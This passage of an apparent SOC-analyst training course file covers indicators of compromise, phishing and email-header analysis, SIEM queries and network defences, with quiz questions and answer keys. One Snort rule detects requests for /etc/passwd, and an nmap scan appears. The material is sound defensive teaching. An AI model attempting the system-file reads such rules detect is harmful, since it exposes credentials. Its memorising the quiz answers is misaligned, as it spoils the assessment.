                Hash values are unique fingerprints generated by cryptographic hash functions (e.g., MD5, SHA-1, SHA-256) for files or data. They serve as indicators of compromise (IOCs) by identifying specific malicious files. However, hash values are considered the easiest indicator for adversaries to change.
              </p>
              <p>
                <strong>How Hashing Works:</strong> A hash function takes input data and produces a fixed-length string that represents the input. Even a minor change in the file will produce a completely different hash.
              </p>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  Calculating an MD5 hash:
                  <br /><code>md5sum malware.exe</code>
                </li>
                <li>
                  Using SHA-256:
                  <br /><code>sha256sum document.pdf</code>
                </li>
              </ul>
              <p>
                <strong>Real-World Scenario:</strong> A malware sample may be identified by its SHA-256 hash. Once detected, the hash is added to threat intelligence feeds. However, attackers can easily recompile or modify their malware to generate a new hash, rendering hash-based detection less effective over time.
              </p>
              <p>
                While useful for initial detection, hash values are considered a low-level indicator on the Pyramid of Pain because of their volatility.
              </p>
            </>
          )
        },
        {
          title: "IP addresses",
          summary: (
            <>
              <p><strong>IP Addresses as Indicators</strong></p>
              <p>
                IP addresses are numerical labels assigned to devices on a network. They can be used as indicators of compromise to identify malicious activity, such as command-and-control servers or sources of attacks. However, like hash values, IP addresses are relatively easy for adversaries to change.
              </p>
              <p>
                <strong>How IP Addresses Work:</strong> Devices are assigned IP addresses that can be static or dynamic. In many cases, attackers use dynamic or spoofed IP addresses to evade detection.
              </p>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  Identifying malicious IP addresses with a tool like <code>nmap</code>:
                  <br /><code>nmap -sV 192.168.1.0/24</code>
                </li>
                <li>
                  Analyzing logs to detect repeated access from a suspicious IP:
                  <br /><code>grep "192.0.2.100" /var/log/auth.log</code>
                </li>
              </ul>
              <p>
                <strong>Real-World Example:</strong> An intrusion detection system (IDS) might flag an IP address associated with a known threat actor. However, if the attacker shifts to a new IP or uses a proxy network, the indicator becomes less reliable. This dynamic nature makes IP addresses a moderate-level indicator on the Pyramid.
              </p>
              <p>
                In summary, while IP addresses can help in tracking attacks, they require correlation with other indicators to be truly effective.
              </p>
            </>
          )
        },
        {
          title: "Domain names",
          summary: (
            <>
              <p><strong>Domain Names as Indicators</strong></p>
              <p>
                Domain names are human-readable addresses that map to IP addresses. They are used by attackers to host malicious content, set up phishing sites, or run command-and-control servers. Like IP addresses, domain names can be easily changed, but they still provide valuable context in threat intelligence.
              </p>
              <p>
                <strong>How Domain Names Work:</strong> Domain names are registered with registrars and managed via DNS. Attackers may use domain generation algorithms (DGAs) to create new domains dynamically.
              </p>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  Checking domain details using <code>whois</code>:
                  <br /><code>whois maliciousdomain.com</code>
                </li>
                <li>
                  Resolving domain names with <code>nslookup</code>:
                  <br /><code>nslookup maliciousdomain.com</code>
                </li>
              </ul>
              <p>
                <strong>Real-World Scenario:</strong> A phishing campaign may use a domain that resembles a legitimate site, such as <code>amaz0n.com</code> instead of <code>amazon.com</code>. Once detected, security teams can block the domain and update threat intelligence feeds. Despite the ease of domain switching, the information provided by a domain name, such as its registration history and associated IP addresses, is invaluable.
              </p>
              <p>
                Domain names, when used in conjunction with other indicators, can enhance an organization's threat-hunting capabilities.
              </p>
            </>
          )
        },
        {
          title: "Network Artifacts",
          summary: (
            <>
              <p><strong>Understanding Network Artifacts</strong></p>
              <p>
                Network artifacts are pieces of evidence found in network traffic and logs that indicate suspicious or malicious activity. These include packet captures, flow data, protocol anomalies, and log entries from devices such as routers, switches, and firewalls.
              </p>
              <p>
                <strong>Examples of Network Artifacts:</strong>
              </p>
              <ul>
                <li>
                  <strong>Packet Captures:</strong> Using tools like Wireshark to capture and analyze network traffic can reveal malicious payloads or abnormal communication patterns.
                </li>
                <li>
                  <strong>Flow Data:</strong> NetFlow data can be used to monitor bandwidth usage and detect unusual data transfers.
                </li>
                <li>
                  <strong>Log Files:</strong> Firewall and IDS logs often contain artifacts such as repeated connection attempts or unusual protocols that can indicate an attack.
                </li>
              </ul>
              <p>
                <strong>Example Command:</strong> Capture network traffic on an interface:
              </p>
              <pre>{`sudo tcpdump -i eth0 -w capture.pcap`}</pre>
              <p>
                Analyzing these artifacts helps defenders identify patterns and anomalies that correlate with malicious behavior. While network artifacts can be more challenging for attackers to modify, they often require sophisticated analysis to extract meaningful insights.
              </p>
              <p>
                Effective monitoring of network artifacts is a key component of threat detection and incident response.
              </p>
            </>
          )
        },
        {
          title: "Host Artifacts",
          summary: (
            <>
              <p><strong>Understanding Host Artifacts</strong></p>
              <p>
                Host artifacts are indicators that reside on individual computers or servers. They include file paths, registry keys, system logs, and configuration files that can reveal evidence of compromise or malicious activity on a specific host.
              </p>
              <p>
                <strong>Examples of Host Artifacts:</strong>
              </p>
              <ul>
                <li>
                  <strong>File System Changes:</strong> Newly created or modified files in sensitive directories. For instance, unexpected executables in the Windows <code>C:\Windows\Temp</code> folder.
                </li>
                <li>
                  <strong>Registry Modifications:</strong> Changes to critical registry keys that control system behavior.
                </li>
                <li>
                  <strong>System Logs:</strong> Windows Event Logs or Linux syslogs that may indicate unauthorized access, failed logins, or unusual process behavior.
                </li>
              </ul>
              <p>
                <strong>Real-World Example:</strong> An analyst might notice an unfamiliar process running on a workstation and then check the system logs or file system artifacts. Using PowerShell:
              </p>
              <pre>{`Get-EventLog -LogName Security -Newest 50 | Where-Object { $_.EventID -eq 4625 }`}</pre>
              <p>
                Such artifacts help pinpoint the origin of an attack and are more difficult for adversaries to change without overhauling their entire methodology.
              </p>
            </>
          )
        },
        {
          title: "Tools",
          summary: (
            <>
              <p><strong>Security Tools and Their Role</strong></p>
              <p>
                Tools are critical components of a cyber defender’s arsenal. In the context of the Pyramid of Pain, tools represent the software and systems that collect, analyze, and correlate various indicators of compromise. While tools themselves can sometimes be replaced or updated by attackers, they provide invaluable insights into adversary behavior.
              </p>
              <p>
                <strong>Examples of Security Tools:</strong>
              </p>
              <ul>
                <li>
                  <strong>SIEM Systems:</strong> Tools like Splunk, ELK, and QRadar aggregate logs from across an organization, helping to correlate events and detect anomalies.
                </li>
                <li>
                  <strong>Threat Intelligence Platforms:</strong> Platforms such as Recorded Future or MISP consolidate threat data, including indicators like IPs, domains, and TTPs.
                </li>
                <li>
                  <strong>Network Analyzers:</strong> Tools like Wireshark and tcpdump capture and analyze network traffic for forensic analysis.
                </li>
                <li>
                  <strong>Endpoint Detection and Response (EDR):</strong> Solutions like CrowdStrike Falcon or SentinelOne monitor host activities and provide detailed forensic data.
                </li>
              </ul>
              <p>
                <strong>Practical Example:</strong> An organization may use a SIEM to aggregate logs from various sources and then apply correlation rules based on MITRE ATT&CK or the Pyramid of Pain to flag suspicious activities. For instance:
              </p>
              <pre>{`# Pseudo-code for a SIEM rule
    if (log.event == "file_created" && file.hash in known_malicious_hashes) {
      alert("Malicious file detected");
    }`}</pre>
              <p>
                These tools provide the backbone for effective threat detection, enabling defenders to rapidly identify and respond to attacks.
              </p>
            </>
          )
        },
        {
          title: "Tactics, Techniques and Procedures (TTPs)",
          summary: (
            <>
              <p><strong>Understanding TTPs in the Context of the Pyramid</strong></p>
              <p>
                Tactics, Techniques, and Procedures (TTPs) represent the behavioral patterns and methods used by adversaries during an attack. Unlike technical indicators like hash values or IP addresses, TTPs are difficult for attackers to change and therefore cause the greatest "pain" when disrupted.
              </p>
              <p>
                <strong>Components of TTPs:</strong>
              </p>
              <ul>
                <li>
                  <strong>Tactics:</strong> The high-level objectives of an attack (e.g., initial access, lateral movement, exfiltration).
                </li>
                <li>
                  <strong>Techniques:</strong> The specific methods employed to achieve each tactic. For example, “Process Injection” or “Credential Dumping.”
                </li>
                <li>
                  <strong>Procedures:</strong> Detailed, repeatable actions that adversaries perform during an attack. These may include the use of specific tools or commands.
                </li>
              </ul>
              <p>
                <strong>Real-World Example:</strong> An attacker might use spear phishing (a technique) to achieve initial access (a tactic) and then perform credential dumping (another technique) to move laterally within a network. This sequence of actions forms the attacker’s TTPs.
              </p>
              <p>
                <strong>Importance in Cyber Defense:</strong> Because TTPs reflect the adversary’s behavior and mindset, detecting and mitigating them can force attackers to change their methods entirely—an outcome that is particularly disruptive.
              </p>
              <p>
                <strong>Example in Practice:</strong> Defenders may analyze incident data and map it to known TTPs using frameworks like MITRE ATT&CK. This mapping can then inform proactive threat hunting and tailored security measures.
              </p>
              <p>
                By focusing on TTPs, organizations can develop more resilient defenses that are harder for attackers to circumvent, thus maximizing the impact on the adversary’s operations.
              </p>
            </>
          )
        }
      ],
      quiz: {
        questions: [
          {
            id: 1,
            question: "What does the Pyramid of Pain illustrate?",
            options: [
              "The difficulty in eliminating certain threat indicators",
              "A network topology",
              "A layered firewall design",
              "An encryption algorithm"
            ],
            correctAnswer: "The difficulty in eliminating certain threat indicators"
          }
        ]
      }
    },
    {
      id: "module5",
      title: "Phishing Emails",
      sections: [
        {
          title: "Phishing Analysis Fundamentals",
          summary: (
            <>
              <p><strong>Understanding Phishing Analysis Fundamentals</strong></p>
              <p>
                Phishing is a form of social engineering attack where attackers impersonate trusted entities to trick victims into revealing sensitive information. Phishing analysis fundamentals involve understanding the underlying tactics, recognizing common indicators of phishing, and knowing how to correlate evidence from various sources.
              </p>
              <p>
                In this section, we discuss the core concepts of phishing analysis. This includes differentiating between various phishing types (e.g., spear phishing, whaling, clone phishing), recognizing behavioral patterns, and knowing the techniques used by attackers to bypass security controls.
              </p>
              <p>
                <strong>Key Areas Covered:</strong>
              </p>
              <ul>
                <li>
                  <strong>Definition and Types:</strong> Phishing, spear phishing, whaling, vishing (voice phishing), and smishing (SMS phishing).
                </li>
                <li>
                  <strong>Indicators of Compromise:</strong> Suspicious sender addresses, urgent language, grammatical errors, and mismatched URLs.
                </li>
                <li>
                  <strong>Behavioral Analysis:</strong> Understanding the psychological triggers exploited by phishing emails such as fear, urgency, and authority.
                </li>
              </ul>
              <p>
                <strong>Example:</strong> A phishing email might impersonate a bank, urging the recipient to click a link to verify account details. Analysis of the email can reveal inconsistencies in the sender’s address and domain, as well as discrepancies in the email header.
              </p>
              <p>
                <strong>Code Snippet – Pseudo SIEM Rule:</strong>
              </p>
              <pre>{`IF email.subject CONTAINS "urgent" 
       AND email.from NOT MATCHING "officialbank.com"
       THEN alert "Potential phishing email detected"`}</pre>
              <p>
                Mastering phishing analysis fundamentals is critical to establishing a robust defense and preventing data breaches. By understanding these basics, analysts can better identify, investigate, and mitigate phishing threats.
              </p>
            </>
          )
        },
        {
          title: "Basics",
          summary: (
            <>
              <p><strong>Phishing Email Basics</strong></p>
              <p>
                Phishing emails are designed to lure recipients into performing an action, such as clicking a malicious link or providing sensitive information. The basic elements of a phishing email often include a deceptive sender address, urgent or threatening language, and a call-to-action that requires immediate response.
              </p>
              <p>
                <strong>Common Characteristics:</strong>
              </p>
              <ul>
                <li>
                  <strong>Suspicious Sender Address:</strong> The email address may look similar to a legitimate one but often contains subtle misspellings or additional characters.
                </li>
                <li>
                  <strong>Urgency and Fear:</strong> Phishing emails frequently use urgent language ("Your account will be suspended!") to prompt hasty action.
                </li>
                <li>
                  <strong>Generic Greetings:</strong> Instead of addressing the recipient by name, the email might use generic greetings like "Dear Customer."
                </li>
                <li>
                  <strong>Inconsistent Branding:</strong> Logos and design elements may appear low-quality or inconsistent with the brand’s official communications.
                </li>
              </ul>
              <p>
                <strong>Example Scenario:</strong> An employee receives an email claiming to be from their IT department asking for a password reset. The email contains spelling errors, a suspicious link, and a generic greeting. Recognizing these red flags helps the recipient avoid clicking the link or divulging sensitive information.
              </p>
              <p>
                Understanding the basics of phishing emails is the first step in building a security awareness program and training employees to identify and report suspicious messages.
              </p>
            </>
          )
        },
        {
          title: "Email Header",
          summary: (
            <>
              <p><strong>Analyzing Email Headers</strong></p>
              <p>
                Email headers contain a wealth of information that can help determine the authenticity of an email. By examining the header, analysts can trace the email’s journey, verify the sender’s domain, and identify potential spoofing or relay attacks.
              </p>
              <p>
                <strong>Key Header Fields:</strong>
              </p>
              <ul>
                <li>
                  <strong>From:</strong> Indicates the sender’s email address, which can be spoofed.
                </li>
                <li>
                  <strong>Received:</strong> Multiple “Received” lines reveal the path the email took, from the sending server to the recipient.
                </li>
                <li>
                  <strong>Subject:</strong> The email’s subject line, which may contain clues about its legitimacy.
                </li>
                <li>
                  <strong>Authentication Results:</strong> Fields such as SPF, DKIM, and DMARC results provide information about whether the email passed authentication checks.
                </li>
              </ul>
              <p>
                <strong>Example:</strong> A legitimate email header might look like:
              </p>
              <pre>{`Received: from mail.officialbank.com (mail.officialbank.com [192.0.2.10])
       by mx.yourisp.com with ESMTPS id abc123
       for <user@yourdomain.com>; Mon, 26 Feb 2025 08:00:00 -0500
    From: "Official Bank" <support@officialbank.com>
    Subject: Important: Account Verification Required
    Authentication-Results: mx.yourisp.com; dkim=pass (signature valid) header.i=@officialbank.com`}</pre>
              <p>
                By contrast, a phishing email header might have inconsistent “Received” lines, fail authentication checks, or show unusual originating IP addresses.
              </p>
              <p>
                Analyzing email headers is a critical skill for SOC analysts and incident responders in determining the legitimacy of email communications.
              </p>
            </>
          )
        },
        {
          title: "Analysis And Tools",
          summary: (
            <>
              <p><strong>Tools and Techniques for Phishing Analysis</strong></p>
              <p>
                A variety of tools and techniques are available to help security teams analyze and investigate phishing emails. These tools aid in examining email headers, scanning URLs, and performing content analysis.
              </p>
              <p>
                <strong>Common Tools Include:</strong>
              </p>
              <ul>
                <li>
                  <strong>Header Analysis Tools:</strong> Services such as MXToolbox or Mailheader.io help parse and analyze email headers.
                </li>
                <li>
                  <strong>URL Scanners:</strong> Tools like VirusTotal or PhishTank can analyze suspicious links and domains.
                </li>
                <li>
                  <strong>Email Sandbox Solutions:</strong> Services like FireEye Email Security or Cisco Email Security can safely detonate and analyze email attachments.
                </li>
                <li>
                  <strong>SIEM Systems:</strong> Correlate phishing alerts with other security events, providing context and facilitating incident response.
                </li>
              </ul>
              <p>
                <strong>Example Workflow:</strong> An analyst receives a suspicious email and uses an online header analyzer to review the “Received” chain and authentication results. The analyst then copies any URLs present in the email and submits them to VirusTotal for scanning. If malicious activity is confirmed, the incident is escalated in the SIEM for further investigation.
              </p>
              <p>
                <strong>Sample Code Snippet – URL Analysis:</strong>
              </p>
              <pre>{`# Pseudo-code for scanning URLs using an API
    const url = "http://suspicious-link.com";
    fetch(` + "`https://api.virustotal.com/v3/urls/${encodeURIComponent(url)}`" + `, {
      headers: { "x-apikey": "your_api_key" }
    })
      .then(response => response.json())
      .then(data => {
        if(data.data.attributes.last_analysis_stats.malicious > 0){
          alert("Malicious URL detected");
        }
      });
    `}</pre>
              <p>
                These tools and techniques enable organizations to quickly assess phishing threats and take proactive measures to mitigate risks.
              </p>
            </>
          )
        },
        {
          title: "Phishing Challenge",
          summary: (
            <>
              <p><strong>Go to the challenge page and test what you learned</strong></p>
              <img
                src="/Challenges/emailanalysischallenge.png"
                alt="emailanalysischallenge"
                className="my-4 w-full max-w-md mx-auto"
              />

             Link to challenge here

            </>
          )
        }
      ],
      quiz: {
        questions: [
          {
            id: 1,
            question: "What is one key element in phishing email analysis?",
            options: [
              "Examining the email header",
              "Designing graphics",
              "Writing code",
              "Configuring routers"
            ],
            correctAnswer: "Examining the email header"
          }
        ]
      }
    },
    {
      id: "module6",
      title: "SIEM",
      sections: [
        {
          title: "SIEM Introduction",
          summary: (
            <>
              <p><strong>What is SIEM?</strong></p>
              <p>
                SIEM stands for Security Information and Event Management. It is a centralized system that collects, aggregates, and analyzes log data from various sources across an organization. SIEM solutions provide real-time monitoring, event correlation, and historical analysis to detect and respond to potential security incidents.
              </p>
              <p>
                SIEM platforms play a crucial role in an organization's cybersecurity strategy by enabling teams to:
              </p>
              <ul>
                <li>
                  <strong>Collect Data:</strong> Gather logs and events from firewalls, intrusion detection systems, endpoints, applications, and more.
                </li>
                <li>
                  <strong>Normalize Data:</strong> Convert disparate log formats into a consistent structure for easier analysis.
                </li>
                <li>
                  <strong>Correlate Events:</strong> Identify patterns and detect suspicious activities by linking events from various sources.
                </li>
                <li>
                  <strong>Generate Alerts:</strong> Automatically trigger alerts based on predefined rules and threat intelligence.
                </li>
                <li>
                  <strong>Support Investigations:</strong> Provide a searchable repository of historical data to facilitate forensic analysis.
                </li>
              </ul>
              <p>
                <strong>Real-World Example:</strong> Consider a scenario where multiple failed login attempts are detected across several endpoints. A SIEM system correlates these events, identifies the pattern as a potential brute force attack, and alerts the security team, enabling them to take prompt action.
              </p>
              <p>
                <strong>Sample SIEM Query:</strong>
              </p>
              <pre>{`# Splunk pseudo-query for detecting brute force attacks:
    index=security sourcetype=auth_logs "failed login"
    | stats count by src_ip
    | where count > 5`}</pre>
              <p>
                SIEM is an essential tool for both proactive threat detection and reactive incident response, providing the visibility needed to maintain robust security.
              </p>
            </>
          )
        },
        {
          title: "Popular SIEM Tools",
          summary: (
            <>
              <p><strong>Leading SIEM Solutions in the Market</strong></p>
              <p>
                Organizations use a variety of SIEM tools based on their size, complexity, and specific security requirements. Popular SIEM solutions offer robust features for log management, event correlation, and incident response.
              </p>
              <p>
                <strong>Examples of Popular SIEM Tools:</strong>
              </p>
              <ul>
                <li>
                  <strong>Splunk:</strong> A highly flexible platform known for its powerful search capabilities and robust analytics.
                </li>
                <li>
                  <strong>IBM QRadar:</strong> A comprehensive SIEM solution that integrates log management, anomaly detection, and threat intelligence.
                </li>
                <li>
                  <strong>ArcSight:</strong> Known for its real-time event correlation and scalability across large enterprise environments.
                </li>
                <li>
                  <strong>LogRhythm:</strong> Provides integrated log management, security analytics, and automated response.
                </li>
                <li>
                  <strong>AlienVault USM:</strong> Combines SIEM with intrusion detection and vulnerability assessment, suitable for small to mid-sized businesses.
                </li>
              </ul>
              <p>
                <strong>Real-World Use Case:</strong> A multinational corporation uses Splunk to ingest logs from thousands of endpoints, network devices, and cloud services. With customized dashboards and alerting rules, the security team can identify anomalies such as unusual data transfers or unexpected login patterns, triggering an investigation.
              </p>
              <p>
                <strong>Example Query in Splunk:</strong>
              </p>
              <pre>{`# Query to identify unusual outbound traffic:
    index=network sourcetype=netflow 
    | stats sum(bytes) as total_bytes by src_ip 
    | where total_bytes > 100000000`}</pre>
              <p>
                The choice of a SIEM tool depends on the specific needs of the organization, the scale of operations, and the existing IT infrastructure. Each tool offers unique capabilities to enhance an organization's security posture.
              </p>
            </>
          )
        },
        {
          title: "Core Components of a SIEM",
          summary: (
            <>
              <p><strong>Understanding the Building Blocks of a SIEM</strong></p>
              <p>
                A SIEM system is composed of several core components that work together to provide comprehensive security monitoring and analysis. Understanding these components is critical to leveraging a SIEM effectively.
              </p>
              <p>
                <strong>Key Components:</strong>
              </p>
              <ul>
                <li>
                  <strong>Data Collection:</strong> This component gathers logs and event data from multiple sources including firewalls, servers, endpoints, and applications. Agents or collectors are used to facilitate this process.
                </li>
                <li>
                  <strong>Normalization and Parsing:</strong> Raw log data is converted into a standardized format, enabling consistent analysis across different sources.
                </li>
                <li>
                  <strong>Correlation Engine:</strong> The heart of a SIEM system, this component analyzes normalized data to identify patterns and link related events. It uses rule-based logic and sometimes machine learning to detect anomalies.
                </li>
                <li>
                  <strong>Alerting and Reporting:</strong> When suspicious patterns are detected, alerts are generated. These alerts can be sent via email, SMS, or integrated into dashboards. Reporting tools help track trends over time and support compliance requirements.
                </li>
                <li>
                  <strong>Dashboards and Visualization:</strong> Customizable dashboards provide a real-time view of the security posture, displaying key metrics, incident trends, and drill-down capabilities for detailed analysis.
                </li>
                <li>
                  <strong>Incident Response and Forensics:</strong> SIEM systems store historical data, allowing analysts to perform forensic investigations and understand the timeline of an incident.
                </li>
              </ul>
              <p>
                <strong>Example Workflow:</strong> Logs from various sources are sent to the SIEM where they are normalized and parsed. The correlation engine identifies that multiple failed logins from a specific IP address correlate with an unusual volume of outbound traffic. An alert is generated and visualized on a dashboard, prompting the SOC team to investigate further.
              </p>
              <p>
                <strong>Sample SIEM Architecture Diagram (Pseudo-Code):</strong>
              </p>
              <pre>{`[Data Sources] --> [Log Collectors/Agents] --> [Normalization Engine] --> [Correlation Engine] --> [Alerting & Reporting] --> [Dashboard & Incident Response]`}</pre>
              <p>
                Each component is crucial to the overall effectiveness of the SIEM, ensuring that potential threats are detected and addressed in a timely manner.
              </p>
            </>
          )
        },
        {
          title: "Investigating with SIEM",
          summary: (
            <>
              <p><strong>Using SIEM for Investigations</strong></p>
              <p>
                SIEM platforms are invaluable for investigating security incidents. They provide a centralized repository of historical data, enabling security teams to trace the origins of an attack, understand its scope, and determine the appropriate remediation actions.
              </p>
              <p>
                <strong>Investigation Process:</strong>
              </p>
              <ul>
                <li>
                  <strong>Alert Analysis:</strong> Start by reviewing alerts generated by the SIEM. Analysts examine the details to identify false positives and prioritize genuine threats.
                </li>
                <li>
                  <strong>Log Correlation:</strong> Use the SIEM’s search and query capabilities to correlate logs from different sources. This helps reconstruct the attack timeline.
                </li>
                <li>
                  <strong>Drill-Down Investigations:</strong> Leverage dashboards and reports to perform deeper analysis. Analysts can use filtering and aggregation to isolate specific events.
                </li>
                <li>
                  <strong>Forensic Analysis:</strong> Historical log data allows analysts to perform a forensic investigation. By examining the sequence of events, they can identify vulnerabilities and assess the impact of the breach.
                </li>
              </ul>
              <p>
                <strong>Real-World Example:</strong> An alert indicates a possible data exfiltration event. The analyst uses the SIEM to run a query:
              </p>
              <pre>{`# Splunk query to track data exfiltration:
    index=network sourcetype=netflow 
    | stats sum(bytes) as total_bytes by src_ip, dest_ip 
    | where total_bytes > 50000000`}</pre>
              <p>
                The query reveals an unusual spike in outbound traffic from a specific server. Further analysis, including reviewing authentication logs and correlating with endpoint alerts, confirms a breach. The investigation leads to the identification of the compromised system and the subsequent mitigation steps.
              </p>
              <p>
                <strong>Incident Response Integration:</strong> Once an investigation is complete, the findings are documented, and remediation actions are initiated. SIEM systems often integrate with ticketing and incident response platforms to streamline this process.
              </p>
              <p>
                In summary, SIEM investigations are a critical aspect of incident response, enabling security teams to detect, analyze, and respond to threats efficiently by leveraging centralized data and advanced analytical capabilities.
              </p>
            </>
          )
        }
      ],
      quiz: {
        questions: [
          {
            id: 1,
            question: "Which is a core function of SIEM?",
            options: [
              "Log aggregation and correlation",
              "Graphic design",
              "Email marketing",
              "Video streaming"
            ],
            correctAnswer: "Log aggregation and correlation"
          }
        ]
      }
    },
    {
      id: "module7",
      title: "Network Security",
      sections: [
        {
          title: "Traffic Analysis",
          summary: (
            <>
              <p><strong>Understanding Traffic Analysis</strong></p>
              <p>
                Traffic analysis is the process of capturing, inspecting, and interpreting network data to identify normal behavior and detect anomalies that might indicate a security incident. By analyzing traffic, security teams can pinpoint malicious activities such as data exfiltration, port scanning, and command-and-control communications.
              </p>
              <p>
                <strong>Key Techniques:</strong>
              </p>
              <ul>
                <li>
                  <strong>Packet Capture:</strong> Using tools such as <code>tcpdump</code> to capture raw packets from a network interface.
                </li>
                <li>
                  <strong>Flow Analysis:</strong> Aggregating network flow data (e.g., NetFlow) to observe traffic patterns and bandwidth usage.
                </li>
                <li>
                  <strong>Protocol Dissection:</strong> Analyzing specific protocols (e.g., HTTP, DNS) to detect unusual behaviors.
                </li>
                <li>
                  <strong>Statistical Analysis:</strong> Using data aggregation to identify deviations from normal traffic volumes.
                </li>
              </ul>
              <p>
                <strong>Examples:</strong> 
              </p>
              <ul>
                <li>
                  Capture traffic on an interface using tcpdump:
                  <br /><code>sudo tcpdump -i eth0 -w traffic.pcap</code>
                </li>
                <li>
                  Analyze traffic flows with NetFlow:
                  <br /><code>nfcapd -r netflow_data_file</code>
                </li>
                <li>
                  Use Wireshark filters to isolate HTTP traffic:
                  <br /><code>http</code>
                </li>
              </ul>
              <p>
                By combining these techniques, analysts can detect early signs of an attack and take proactive measures to mitigate potential threats.
              </p>
            </>
          )
        },
        {
          title: "Firewall",
          summary: (
            <>
              <p><strong>Introduction to Firewalls</strong></p>
              <p>
                Firewalls serve as the first line of defense in network security by monitoring and controlling incoming and outgoing network traffic based on predefined security rules. They act as barriers between trusted internal networks and untrusted external networks.
              </p>
              <p>
                <strong>Types of Firewalls:</strong>
              </p>
              <ul>
                <li>
                  <strong>Network Firewalls:</strong> Hardware or software solutions that control traffic at the perimeter of a network. Examples include Cisco ASA and Fortinet.
                </li>
                <li>
                  <strong>Host-Based Firewalls:</strong> Software installed on individual machines to filter traffic at the device level. Windows Defender Firewall and Linux iptables are typical examples.
                </li>
                <li>
                  <strong>Next-Generation Firewalls (NGFW):</strong> Combine traditional firewall capabilities with intrusion prevention, application awareness, and deep packet inspection.
                </li>
              </ul>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  Configure iptables on Linux to allow SSH traffic:
                  <br /><code>sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT</code>
                </li>
                <li>
                  Using a commercial firewall to block unapproved protocols and filter malicious traffic.
                </li>
              </ul>
              <p>
                Firewalls are essential for blocking unauthorized access while logging events that can be used for further analysis. Their configuration is a critical aspect of a layered security strategy.
              </p>
            </>
          )
        },
        {
          title: "IDS/IPS",
          summary: (
            <>
              <p><strong>Intrusion Detection and Prevention Systems</strong></p>
              <p>
                IDS (Intrusion Detection Systems) and IPS (Intrusion Prevention Systems) are designed to monitor network or system activities for malicious actions and policy violations. While IDS focuses on alerting security personnel, IPS takes a proactive role by automatically blocking detected threats.
              </p>
              <p>
                <strong>Key Features:</strong>
              </p>
              <ul>
                <li>
                  <strong>Signature-Based Detection:</strong> Compares network traffic to known attack patterns.
                </li>
                <li>
                  <strong>Anomaly-Based Detection:</strong> Identifies deviations from normal behavior.
                </li>
                <li>
                  <strong>Real-Time Alerts:</strong> Notifies administrators immediately upon detecting suspicious activity.
                </li>
                <li>
                  <strong>Automated Response:</strong> IPS solutions can block traffic or terminate sessions automatically.
                </li>
              </ul>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  Deploy Snort as an IDS. A basic Snort rule might be:
                  <br /><code>{`alert tcp any any -> any 80 (msg:"Possible HTTP exploit"; content:"/etc/passwd"; sid:1000001; rev:1;)`}</code>
                </li>
                <li>
                  Use a commercial IPS solution like Palo Alto Networks or Cisco Firepower to automatically block malicious traffic.
                </li>
              </ul>
              <p>
                IDS/IPS systems are integral to detecting and mitigating attacks in real time, complementing firewalls by providing detailed analysis of network behavior.
              </p>
            </>
          )
        },
        {
          title: "WAF",
          summary: (
            <>
              <p><strong>Understanding Web Application Firewalls (WAF)</strong></p>
              <p>
                A Web Application Firewall (WAF) protects web applications by filtering and monitoring HTTP/HTTPS traffic between a web application and the Internet. It focuses on preventing attacks at the application layer, such as SQL injection, cross-site scripting (XSS), and other vulnerabilities.
              </p>
              <p>
                <strong>Key Functions:</strong>
              </p>
              <ul>
                <li>
                  <strong>Input Validation:</strong> Inspects incoming traffic for malicious payloads.
                </li>
                <li>
                  <strong>URL Filtering:</strong> Blocks access to potentially harmful URLs.
                </li>
                <li>
                  <strong>Traffic Monitoring:</strong> Analyzes web traffic to detect anomalies.
                </li>
              </ul>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  Deploy Cloudflare’s WAF to protect an e-commerce website from common web exploits.
                </li>
                <li>
                  Configure custom WAF rules on a platform like F5 BIG-IP to block suspicious patterns in HTTP requests.
                </li>
              </ul>
              <p>
                A properly configured WAF can significantly reduce the risk of application-layer attacks by blocking malicious requests before they reach the web server.
              </p>
            </>
          )
        },
        {
          title: "Web",
          summary: (
            <>
              <p><strong>Securing Web Traffic</strong></p>
              <p>
                Protecting web traffic is crucial for maintaining the confidentiality and integrity of data transmitted between clients and web servers. This involves implementing HTTPS, securing web sessions, and monitoring for anomalies in HTTP/HTTPS traffic.
              </p>
              <p>
                <strong>Best Practices:</strong>
              </p>
              <ul>
                <li>
                  <strong>Encryption:</strong> Enforce HTTPS to encrypt data in transit.
                </li>
                <li>
                  <strong>Secure Cookies:</strong> Configure cookies with the Secure and HttpOnly flags to protect session data.
                </li>
                <li>
                  <strong>Traffic Inspection:</strong> Use reverse proxies and load balancers that inspect traffic for potential threats.
                </li>
              </ul>
              <p>
                <strong>Example Code in Node.js (Express):</strong>
              </p>
              <pre>{`// Enforce HTTPS and secure sessions in Express
    app.use((req, res, next) => {
      if (!req.secure) {
        return res.redirect('https://' + req.headers.host + req.url);
      }
      next();
    });
    
    app.use(session({
      secret: 'your_secret_key',
      cookie: { secure: true, httpOnly: true }
    }));`}</pre>
              <p>
                These measures help ensure that web traffic remains secure and that sensitive information is protected from interception and tampering.
              </p>
            </>
          )
        },
        {
          title: "DNS",
          summary: (
            <>
              <p><strong>DNS Security and Monitoring</strong></p>
              <p>
                The Domain Name System (DNS) translates domain names into IP addresses, playing a crucial role in network operations. However, DNS is also a common target for attackers using techniques like DNS hijacking and cache poisoning.
              </p>
              <p>
                <strong>Key DNS Security Practices:</strong>
              </p>
              <ul>
                <li>
                  <strong>DNS Filtering:</strong> Block access to known malicious domains using threat intelligence feeds.
                </li>
                <li>
                  <strong>DNSSEC:</strong> Implement DNS Security Extensions to ensure the authenticity of DNS responses.
                </li>
                <li>
                  <strong>Monitoring:</strong> Regularly analyze DNS logs to detect anomalous queries or patterns indicative of exfiltration or command-and-control communications.
                </li>
              </ul>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  Query DNS records using <code>dig</code>:
                  <br /><code>dig +dnssec example.com</code>
                </li>
                <li>
                  Check DNS logs for unusual query volumes.
                </li>
              </ul>
              <p>
                Effective DNS security is a cornerstone of overall network defense, as many advanced threats use DNS as a vector for attack.
              </p>
            </>
          )
        },
        {
          title: "Wireshark Basic",
          summary: (
            <>
              <p><strong>Introduction to Wireshark</strong></p>
              <p>
